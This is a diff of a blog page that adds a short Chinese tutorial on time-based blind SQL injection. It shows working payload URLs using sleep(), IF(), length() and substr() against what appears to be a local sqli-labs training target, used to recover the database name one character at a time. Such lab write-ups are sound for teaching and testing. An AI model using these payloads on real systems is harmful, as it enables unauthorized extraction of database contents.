@@ -68,11 +68,24 @@
       
       
       
-      <h2 id="sql时间盲注"><a href="#sql时间盲注" class="headerlink" title="sql时间盲注"></a>sql时间盲注</h2>
+      <h2 id="sql时间盲注"><a href="#sql时间盲注" class="headerlink" title="sql时间盲注"></a>sql时间盲注</h2><h4 id="SQL注入-时间注入"><a href="#SQL注入-时间注入" class="headerlink" title="SQL注入-时间注入"></a>SQL注入-时间注入</h4><p>​            时间注入攻击</p>
+<h4 id="时间注入攻击"><a href="#时间注入攻击" class="headerlink" title="时间注入攻击"></a>时间注入攻击</h4><p>利用sleep()或者benchmark()等函数让MySQL的执行时间变长。与IF(expr1,expr2,expr3)结合使用。当满足条件expr1时执行expr2，不满足时执行expr3。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.17.137/sql/Less-1/?id=1&#x27; and if(length(database())&gt;1,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+
+
+<p>执行时间为5s以上<br><img src="https://img-blog.csdnimg.cn/2021041613503592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeGluXzEwMTA=,size_16,color_FFFFFF,t_70"></p>
+<p>执行很短时间返回结果(正确会延迟5秒返回，错误直接返回)</p>
+<p><img src="https://img-blog.csdnimg.cn/20210416135113591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeGluXzEwMTA=,size_16,color_FFFFFF,t_70"></p>
+<p>多次使用length()可以判断数据库库名长度<br>知晓库名长度后使用substr函数逐位查询数据库库名字母</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.17.137/sql/Less-1/?id=1&#x27; and if(substr(database(),1,1)=&#x27;s&#x27;,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210416135535820.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeGluXzEwMTA=,size_16,color_FFFFFF,t_70"></p>
+<p>程序超过5s返回，证明数据库名第一位为’s’</p>
+
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/10/20/sql%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" data-id="ckv0rclvp0009vwtc5ry50eex" class="article-share-link">
+      <a data-url="http://example.com/2021/10/20/sql%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" data-id="ckv3t6mm900095otc4dpk3l9l" class="article-share-link">
         Share
       </a>
       
